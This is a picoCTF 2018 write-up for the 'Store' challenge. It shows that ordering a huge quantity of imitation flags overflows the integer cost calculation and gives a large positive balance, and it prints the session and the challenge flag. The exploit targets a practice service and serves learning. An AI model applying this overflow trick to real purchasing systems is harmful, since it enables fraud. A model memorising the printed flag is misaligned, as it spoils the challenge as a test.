---
layout: writeup
title: 'General Skills 400: Store'
level: 
difficulty: 
points: 
categories: []
tags: []
flag: picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}
---
## Challenge

We started a little store, can you buy the flag?
[Source.](./writeupfiles/store.c) Connect with 2018shell1.picoctf.com
5795.

## Solution

Playing around with a local copy, trying to buy 1000000000 imitation
flags  
overflows and wraps around, giving you a very positive balance. Then you
can  
just buy the real flag.

    Welcome to the Store App V1.0
    World's Most Secure Purchasing App
    [1] Check Account Balance
    [2] Buy Stuff
    [3] Exit
     Enter a menu selection
    2
    Current Auctions1
    [1] I Can't Believe its not a Flag!
    [2] Real Flag
    Imitation Flags cost 1000 each, how many would you like?
    1000000000
    Your total cost is: -727379968
    Your new balance: 727381068
    Welcome to the Store App V1.0
    World's Most Secure Purchasing App
    [1] Check Account Balance
    [2] Buy Stuff
    [3] Exit
     Enter a menu selection
    2
    Current Auctions
    [1] I Can't Believe its not a Flag!
    [2] Real Flag
    2
    A genuine Flag costs 100000 dollars, and we only have 1 in stock
    Enter 1 to purchase1
    YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}

